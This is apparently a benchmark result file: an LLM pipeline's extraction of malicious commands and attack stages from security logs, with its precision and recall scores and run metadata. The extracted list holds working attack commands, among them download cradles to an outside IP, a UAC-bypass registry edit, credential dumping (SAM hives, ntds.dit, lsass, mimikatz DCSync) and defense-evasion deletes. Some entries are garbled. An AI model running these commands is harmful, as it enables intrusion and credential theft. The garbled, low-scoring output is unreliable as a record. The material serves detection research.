@@ -1,0 +1,140 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8084/a.exe C:\\a.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\\u0106\\u03AC\\U+200B\\u16F0\\u2609\\.ps1 ",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\" ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\" ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd /C \\\"reg add \\\\\"HKCU:\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\\" /ve /d \\\"C:\\\\Windows\\\\System32\\\\cmd.exe\\\" /f\\\" ",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg add hkcu\\\\software\\\\classes\\\\ms-settings\\\\shell\\\\open\\\\command /v \\\"DelegateExecute\\\" /f ",
+        "stage": "Persistence"
+      },
+      {
+        "command": "sch tasks /create /tn test /tr c:\\test\\1053.005.bat /sc onlogon ",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C New-Item ",
+        "stage": "Persistence"
+      },
+      {
+        "command": "New-Item -Path $env:TEMP\\\\T1059_powershell_collection -ItemType Directory -Force | Out-Null Get-ChildItem -Recurse -Include *.* | % {Copy-Item $_.FullName -destination $env:TEMP\\\\T1059_powershell_collection}",
+        "stage": "Discovery"
+      },
+      {
+        "command": "pow er sh ell.ex e-In vo ke-A tom icTe st T11 3400 1-T es tN um be rs 1  ",
+        "stage": "Discovery"
+      },
+      {
+        "command": "reg.exe SAVE hklm\\\\sam c:\\users\\\\admini~1\\\\appdata\\\\local\\\\temp\\\\tthwwf",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "reg.exe SAVE hklm\\\\security c:\\users\\\\admini~1\\\\appdata\\\\local\\\\temp\\\\tjbvkjpetfjp",
+        "stage": "Collection"
+      },
+      {
+        "command": "reg.exe SAVE hklm\\\\system c:\\users\\\\admini~1\\\\appdata\\\\local\\\\temp\\\\qsdirkg",
+        "stage": "Collection"
+      },
+      {
+        "command": "reg.exe SAVE HKLM\\\\SYSTEM C:\\Windows\\\\Temp\\\\SYSTEM_HIVE",
+        "stage": "Collection"
+      },
+      {
+        "command": "esentutl.exe /y /vss c:\\windows\\\\ntds\\\\ntds.dit /d c:\\ntds.dit ",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "procdump.exe  -accepteula -ma lsass.exe C:\\Windows\\\\Temp\\\\lsass_dump.dmp ",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "lazagne1.exe browsers ",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "mimikatz2.exe  lsadump::sam exit ",
+        "stage": "Collection"
+      },
+      {
+        "command": "mimikatz.exe  LSADUMP::DCSync exit ",
+        "stage": "Collection"
+      },
+      {
+        "command": "cmd  /c start /min sangforcat.exe -v -server https://124.223.85.207:8443 ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"\" ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe & {reg delete HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\*}",
+        "stage": "Defense Evasion"
+      }
+    ],
+    "narrative": "An advanced threat actor executed an initial access phase through certutil, followed by further exploitation via PowerShell, establishing Command-and-Control channels while executing various discovery, persistence, credential collection, and defense evasion techniques.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 42751,
+      "completion_tokens": 7530,
+      "total_tokens": 50281,
+      "wall_clock_s": 280.921,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.22727272727272727,
+      "recall": 0.22727272727272727,
+      "f1": 0.22727272727272727,
+      "tp": 5,
+      "fp": 17,
+      "fn": 17
+    },
+    "stage": {
+      "precision": 0.13636363636363635,
+      "recall": 0.13043478260869565,
+      "f1": 0.1333333333333333,
+      "tp": 3,
+      "fp": 19,
+      "fn": 20,
+      "recall_partial": 0.1956521739130435
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 42751,
+      "completion_tokens": 7530,
+      "total_tokens": 50281,
+      "wall_clock_s": 280.921,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
